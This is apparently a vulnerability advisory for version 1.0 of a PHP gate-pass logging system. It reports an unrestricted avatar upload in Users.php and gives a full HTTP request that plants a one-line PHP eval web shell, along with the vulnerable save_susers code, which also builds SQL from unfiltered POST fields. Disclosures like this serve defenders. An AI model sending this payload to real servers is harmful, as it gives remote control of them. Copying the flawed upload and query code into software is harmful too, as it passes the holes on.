## Affected version: 
EMPLOYEE AND VISITOR GATE PASS LOGGING SYSTEM - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

## Vulnerability File:
/employee_gatepass/classes/Users.php?f=ssave

## Description:
System Employee and Guest Gate Pass Logging 1.0 is vulnerable to an unrestricted file upload attack via /employee_gatepass/classes/Users.php?f=ssave. This function does not impose restrictions on upload suffixes. A malicious actor could exploit this vulnerability to directly take over the target server. 

Status: CRITICAL

POC
```
POST /employee_gatepass/classes/Users.php?f=ssave HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------138523865236681880423858409304
Content-Length: 951
Origin: http://localhost
Connection: close
Referer: http://localhost/employee_gatepass/admin/?page=user/manage_user&id=11
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23

-----------------------------138523865236681880423858409304
Content-Disposition: form-data; name="id"

1
-----------------------------138523865236681880423858409304
Content-Disposition: form-data; name="firstname"

Claire
-----------------------------138523865236681880423858409304
Content-Disposition: form-data; name="lastname"

Blake
-----------------------------138523865236681880423858409304
Content-Disposition: form-data; name="username"

cblake
-----------------------------138523865236681880423858409304
Content-Disposition: form-data; name="password"


-----------------------------138523865236681880423858409304
Content-Disposition: form-data; name="type"

1
-----------------------------138523865236681880423858409304
Content-Disposition: form-data; name="img"; filename="1234.php"
Content-Type: application/octet-stream

<?php eval($_POST[1]);?>
-----------------------------138523865236681880423858409304--

```

Directly connect to the webshell management tool through the following address
http://localhost/employee_gatepass/uploads/1715653620_1234.php

![image](https://github.com/I-Schnee-I/cev/assets/58547398/4db9fcea-464b-4d48-b8e4-b4f726cff3c9)

## code analysis:

In the save_susers() method, the upload point directly uploads to the target server without any filtering on the upload suffix.
```
public function save_susers(){
		extract($_POST);
		$data = "";
		foreach($_POST as $k => $v){
			if(!in_array($k, array('id','password'))){
				if(!empty($data)) $data .= ", ";
				$data .= " `{$k}` = '{$v}' ";
			}
		}

			if(!empty($password))
			$data .= ", `password` = '".md5($password)."' ";
		
			if(isset($_FILES['img']) && $_FILES['img']['tmp_name'] != ''){
				$fname = 'uploads/'.strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
				$move = move_uploaded_file($_FILES['img']['tmp_name'],'../'. $fname);
				if($move){
					$data .=" , avatar = '{$fname}' ";
					if(isset($_SESSION['userdata']['avatar']) && is_file('../'.$_SESSION['userdata']['avatar']))
						unlink('../'.$_SESSION['userdata']['avatar']);
				}
			}
			$sql = "UPDATE students set {$data} where id = $id";
			$save = $this->conn->query($sql);

			if($save){
			$this->settings->set_flashdata('success','User Details successfully updated.');
			foreach($_POST as $k => $v){
				if(!in_array($k,array('id','password'))){
					if(!empty($data)) $data .=" , ";
					$this->settings->set_userdata($k,$v);
				}
			}
			if(isset($fname) && isset($move))
			$this->settings->set_userdata('avatar',$fname);
			return 1;
			}else{
				$resp['error'] = $sql;
				return json_encode($resp);
			}

	} 
	
}
```
